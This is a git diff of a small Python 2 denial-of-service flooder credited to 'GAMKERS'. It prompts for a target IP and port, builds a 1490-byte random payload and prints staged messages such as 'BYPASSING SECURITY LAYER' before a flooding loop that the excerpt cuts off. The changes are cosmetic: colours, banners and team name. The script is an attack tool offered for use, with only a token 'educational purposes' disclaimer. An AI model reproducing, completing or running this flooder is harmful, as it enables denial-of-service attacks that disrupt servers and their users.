@@ -1,4 +1,4 @@
-print ("\033[91m")
+print ("\033[92m")
 import sys
 import os
 import time
@@ -19,7 +19,7 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet GAMKERS-DDOS")
+os.system("figlet -f banner GAMKERS-DDOS")
 print
 print "Coded By : GAMKERS"
 print "Author   : GAMKERS"
@@ -29,19 +29,18 @@ print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 os.system("clear")
-print("\033[93m")
-os.system("figlet DdoS Attack")
-print("Team : T34m V18rs")
+os.system("figlet DdoS GAMKERS")
+print("Team : GAMKERS")
 print ("\033[92m")
-print "TRYING TO REACH THE SERVER"
+print "________________TRYING TO REACH THE SERVER_____________________"
 time.sleep(5)
-print "ESTABLISHING CONNECTION"
+print "_________________ESTABLISHING CONNECTION_______________________"
 time.sleep(5)
-print "BYPASSING SECURITY LAYER"
+print "_________0100100 BYPASSING SECURITY LAYER 001010_______________"
 time.sleep(5)
-print "CONNECTION ESTABLISHED"
+print "_________________CONNECTION ESTABLISHED________________________"
 time.sleep(5)
-print "DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
+print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
 time.sleep(3)
 sent = 0
 while True:
